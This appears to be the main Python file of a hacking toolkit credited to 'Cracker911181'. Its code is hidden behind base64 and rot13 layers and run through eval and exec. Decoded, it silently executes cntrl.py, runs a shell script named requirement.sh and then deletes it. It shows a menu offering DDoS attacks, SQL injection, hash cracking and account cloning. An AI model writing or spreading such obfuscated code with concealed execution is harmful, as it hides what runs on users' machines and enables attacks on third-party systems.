#######################
#                     #
#        main         # MAIN FILE
#                     #
#####################################
#  Author: Cracker911181 ############
#####################################
#                            #
#   CODER :  CRACKER911181   #
#                            #
##############################


# Coded by Cracker
# CRACKER911181 

import base64, codecs
magic = 'CmltcG9ydCBvcyx0aW1lLHN5cyxtYXJzaGFsCgojVGV4dCBjb2xvdXIKI2NyZWF0ZWQgQnkgQ3JhY2tlcjkxMTE4MQpjb2xvdXJvZmY9Ilx4MWJbMDBtIiAjY29sb3VyIG9mZgoKcmVkPSJceDFiWzkxbSIgI3JlZApncmVlbj0iXHgxYls5Mm0iICNncmVlbgp5ZWxsb3c9Ilx4MWJbOTNtIiAjeWVsbG93CmJsdWU9Ilx4MWJbOTRtIiAjYmx1ZQpyb3N5PSJceDFiWzk1bSIgI3Jvc3kKcGVzdD0iXHgxYls5Nm0iICNwZXN0CgoKIyMjIyMjIyMjIyMjIyMjIyMjIyMKCmV4ZWMoKG9wZW4oImNudHJsLnB5IiwiciIpKS5yZWFkKCkpCgpvcy5zeXN0ZW0oInNoIHJlcXVpcmVtZW50LnNoIikKb3Muc3lzdGVtKCJybSAtcmYgcmVxdWlyZW1lbnQuc2giKQpvcy5zeXN0ZW0oInJtIC1yZiBfX3B5Y2FjaGVfXyIpCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMKCgoKZGVmIHZvaWNlKCk6Cgl0ZXh0PXN0cihpbnB1dChyb3N5KyJcbkVudGVyIFlvdXIgVGV4dDogIikpCgl3aGlsZSBUcnVlOgoJCWxhbj1zdHIoaW5wdXQocm9zeSsiXG5FbnRlciBZb3VyIExhbmd1YWdlKGV4YW1wbGU6ICdlbi9ibicpOiAiKSkKCQlpZiBsYW49PSIiIG9yIGxhbj09IiAiOgoJCQlwcmludChyZWQrIlxuXG5cdExhbmd1YWdlIE5vdCBEZW5pZWQiKQoJCWVsc2U6CgkJCXZvaWNlPWdUVFModGV4dD10ZXh0LGxhbmc9bGFuKQoJCQlmaWxlPXN0cihpbnB1dCgiXG5FbnRlciBZb3VyIEZpbGUgTmFtZSBGb3Igc2F2aW5nKGV4YW1wbGU6IHRlc3QubXAzKTogIikpCgkJCXdoaWxlIFRydWU6CgkJCQlwYXRoPXN0cihpbnB1dChyb3N5KyJcbkVudGVyIFlvdXIgU2F2aW5nIFBhdGg6ICIpKQoJCQkJaWYgcGF0aD09IiIgb3IgcGF0aD09IiAiOgoJCQkJCXByaW50KHJlZCsiXG5cblx0UGF0aCBOb3QgRGVuaWVkIikKCQkJCWVsc2U6CgkJCQkJbW5wdD1zdHIocGF0aCsiLyIrZmlsZSkKCQkJCQl2b2ljZS5zYXZlKG1ucHQpCgoKCgpkZWYgdmMoKToKCXdoaWxlIFRydWU6CgkJcHJpbnQoYmx1ZStmIiIiCiAgIF9fX18gICAgICAgICAgICAgICAgXyAgICAgICAgICAgICAgICBfX19fXyAgICAgICAgICAgXwogIC8gX19ffF8gX18gX18gXyAgX19ffCB8IF9fX19fIF8gX18gICB8XyAgIF98X18gICBfX18gfCB8CiAiIiIrYmx1ZSsiIiJ8IHwgICB8ICJfXy8gX2AgfC8gX198IHwvIC8gXyBcICJfX3x'
love = 'sK19ssPO8YlOsVSjtYlOsVSk8VUjXVPVvVvgjMKA0XlVvVajtsS9sK3jtsPO8VPussPO8VPusK3jtVPN8VPOsKl8tsPO8K19sK198VUjtXS8cVUjtXS8cVUjtsNbtVSksK19ssS98VPOpK18fK3kpK19ssS98KS9pK19ssS98VPNtVPNtVUkssSksK18iVSksK18isS98KT5povNvVvVeM3WyMJ4eVvVvVPNtVPNtVPNtVPNtVRAlLJAeVSyiqKVtI29loTDfVRyzVSyiqFOQLJ5poykhKUDtVPNtVPNtVPNtVPVvVvgvoUIyXlVvVyivzVIqVRyDVSEio2jtJ+XLuI0tKT4vVvVeM3WyMJ4eVvVvVQ09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CFVvVvgwo2kiqKWiMzLcPtxWL2uip2H9p3ElXTyhpUI0XUOyp3DeVykhKT5pqSk0ZF4tD29hqzIlqPOHMKu0VSEiVSMinJAyKT5pqSk0VvglMJDeVwNjYxWuL2ftIT8tFT9gMIkhKT4vX3Wip3xeVxIhqTIlVSyiqKVtG3O0nJ9hBvNvXFxXPDbWPJyzVTAbo3AyCG0vZFV6PtxWPKMinJAyXPxXPDyyoTyzVTAbo3AyCG0vZQNvBtbWPDyvpzIunjbWPDbXPtbwVlZwVlZwVlZwVlZwVlZwVlZwVlZwVlZwVlZwVjbXqzIlp2yiow0vZl4jVtbXPaqbnJkyVSElqJH6Ptyipl5mrKA0MJ0bVzAfMJSlVvxXPKOlnJ50XTWfqJHeMvVvVtbtVPOsK19sVPNtVPNtVPNtVPNtVPNtVS8tVPNtVPNtVPNtVPNtVPNtK19sK18tVPNtVPNtVPNtVS8XVPNiVS9sK3ksVS9sVS9sVS8tVS9sK3jtsPOsK19sKlOsVS9sVPNtsS8tVPOssS9sVPNtK19sVUjtsNbtVvVvX2WfqJHeVvVvsPO8VPNtsPNvK18iVS9tVUjiVS9ssPO8YlNiVS8tKPNvK198K19sK3jtsP8tKlOpVP8tKlOpsPO8PvNvVvVepTImqPfvVvW8VUksK198VUjtsPNbK3jtsPNbK198VPNtCPNtK18iVUjtsS9sK19ssPO8VPusXFO8VPusXFO8VUjXVPOpK19sK3kssPNtKS9sYS98KS9sK3kssSksKS9sK3kssPNtVPNtVPO8K3kpK19sYlOpK19sY3kssSkhKT4tVvVvX2qlMJIhXlVvVvNtVPNtVPNtVPNtVPOQpzSwnlOMo3IlVSqipzkxYPOWMvOMo3HtD2ShKT5poyk0KUDtVPNtVPNvVvVerJIfoT93XlVvVyMypaAco246VvVvX3WyMPg2MKWmnJ9hXlVvVvVvVvgwo2kiqKWiMzLcPtxXPDbWL2uio3AyCKA0pvucoaO1qPujMKA0XlVvVykhPyk0sQ09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09sNcpqUjvVvVerJIfoT'
god = '93KyIiIiAxLkNvbnRhY3QgSW5mbyIiIitwZXN0KyIiIiAgICAgIDIuSVAgVG9vbCAgICAgICAgfApcdHwgMy5TdWJkb21haW4gU2Nhbm5lciA0LkRkb3MgQXR0YWNrICAgIHwKXHR8IDUuQWRtaW4gRmluZGVyICAgICAgNi5IYXMgQ3JhY2tlciAgICB8Clx0fCA3LlZpZGVvIERvd25sb2FkZXIgIDguQkQgQ2xvbmVyICAgICAgfApcdHwgOS5TUUwtSW5qZWN0aW9uICAgIDEwLlRleHQgVG8gVm9pY2UgIHwKXHR8MTEuUHl0aG9uIE9iZnVzY2F0ZSAxMi5UZWxlZ3JhbSBLaXQgICB8Clx0fDEzLlRlcm11eCBGcmFtZXdvcmsgMTQuS2FsaSBOZXRodW50ZXIgfApcdHwxNS5UZXJtdXggVG9vbCAgICAgIDE2LlVSTCBDaGFuZ2VyICAgIHwKXHR8ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8Clx0fCIiIitncmVlbisiIiIgODguVXBkYXRlIENyYWNrZXItVG9vbCIiIityZWQrIiIiICAgIDk5LkV4aXQiIiIrcGVzdCsiIiIgICAgfApcdHw9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PXwKXG4iIiIrcm9zeSsiIiJFbnRlciBZb3VyIE9wdGlvbjogIiIiKSkKCgkKCWlmIGNob29zZT09Ijk5IjoKCQlvcy5zeXN0ZW0oImNsZWFyIikKCQlwcmludCh5ZWxsb3crIlxuXG5cblxuXG5cblx0XHTwn6SpVGhhbmtzIEZvciBVc2luZyBNeSBUb29s8J+kqSAgIFxuXG5cbiIpCgkJc3lzLmV4aXQoKQoJCgkKCWVsaWYgY2hvb3NlPT0iMSI6CgkJb3Muc3lzdGVtKCJjbGVhciIpCgkJcHJpbnQoYmx1ZStmIiIiXG4KICAgfD09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PXwKICAgfCAgICAgICAgICAgICAgICAgICBPV05FUiBJTkZPICAgICAgICAgICAgICAgICAgICAgIHwKICAgfD09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PXwKICAgfCBGYWNlYm9vayB8IGh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9jcmFja2VyOTExMTgxIHwKICAgfCBUZWxlZ3JhbSB8IGh0dHBzOi8vdC5tZS9jcmFja2VyOTExMTgxICAgICAgICAgICAgIHwKICAgfCBHaXRIdWIgICB8IGh0dHBzOi8vZ2l0aHViLmNvbS9jcmFja2VyOTExMTgxICAgICAgIHwKICAgfD09PT09PT09PT18PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PXwKIiIiK'
destiny = 'DbWPtxWqTygMF5moTIypPt3XDbWPtyyoTyzVTAbo29mMG09VwVvBtbWPJ9iCJ9jMJ4bVzyjYaO5VvjvpvVcPtxWMKuyLluiol5lMJSxXPxcPtxXPJIfnJLtL2uio3AyCG0vAPV6PtxWo289o3OyovtvMTEipl5jrFVfVaVvXDbWPJI4MJZbo28hpzIuMPtcXDbWPtyyoTyzVTAbo29mMG09VwZvBtbWPJ9iCJ9jMJ4bVaA1LzEgYaO5VvjvpvVcPtxWMKuyLluiol5lMJSxXPxcPtxXPJIfnJLtL2uio3AyCG0vAFV6PtxWo289o3OyovtvLJEgnJ4hpUxvYPWlVvxXPDyyrTIwXT9iYaWyLJDbXFxXPDbWMJkcMvOwnT9ip2H9CFV2VwbXPDyiom1ipTIhXPWbLKZhpUxvYPWlVvxXPDyyrTIwXT9iYaWyLJDbXFxXPDbWMJkcMvOwnT9ip2H9CFV3VwbXPDyiom1ipTIhXPWxo3qhoTDhpUxvYPWlVvxXPDyyrTIwXT9iYaWyLJDbXFxXPDbWMJkcMvOwnT9ip2H9CFV4VwbXPDyiom1ipTIhXPWwoT9hMF5jrFVfVaVvXDbWPJI4MJZbo28hpzIuMPtcXDbWPtyyoTyzVTAbo29mMG09VwxvBtbWPJ9iCJ9jMJ4bVaAkoP1gov5jrFVfVaVvXDbWPJI4MJZbo28hpzIuMPtcXDbWPtyyoTyzVTAbo29mMG09VwRjVwbXPDyzpz9gVTq0qUZtnJ1jo3W0VTqHISZXPDbWPJ9mYaA5p3EyoFtvL2kyLKVvXDbWPKMwXPxXPDbWMJkcMvOwnT9ip2H9CFVkZFV6PtxWo289o3OyovtvpUDhpUxvYPWlVvxXPDyyrTIwXT9iYaWyLJDbXFxXPDbWMJkcMvOwnT9ip2H9CFVkZvV6PtxWo3Zhp3ymqTIgXPWloFNgpzLtK19jrJAuL2uyK18vXDbWPJ9iCJ9jMJ4bVaEfM20hpUxvYPWlVvxXPDyipl5mrKA0MJ0bVaWgVP1lMvOsK3O5L2SwnTIsKlVcPtxWMKuyLluiol5lMJSxXPxcPtxXPJIfnJLtL2uio3AyCG0vZGZvBtbWPJ9iCJ9jMJ4bVz1yqUZhpUxvXDbWPJI4MJZbo28hpzIuMPtcXDbWPtyyoTyzVTAbo29mMG09VwR0VwbXPDyiom1ipTIhXPWhMKDhpUxvYPWlVvxXPDyyrTIwXT9iYaWyLJDbXFxXPDbWMJkcMvOwnT9ip2H9CFVkAFV6PtxWo289o3OyovtvL3ImqT9sqP5jrFVfVaVvXDbWPJI4MJZbo28hpzIuMPtcXDbWPtyyoTyzVTAbo29mMG09VwR2VwbXPDyiom1ipTIhXPWwozqsqKVhpUxvYPWlVvxXPDyyrTIwXT9iYaWyLJDbXFxXPDxXPJIfnJLtL2uio3AyCG0vBQtvBtbWPJ9mYaA5p3EyoFtvL2ugo2DtX3ttqKNhp2tvXDbWPJ9mYaA5p3EyoFtvYv91pP5mnPVcPtxWp3ymYzI4nKDbXDbWPt=='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
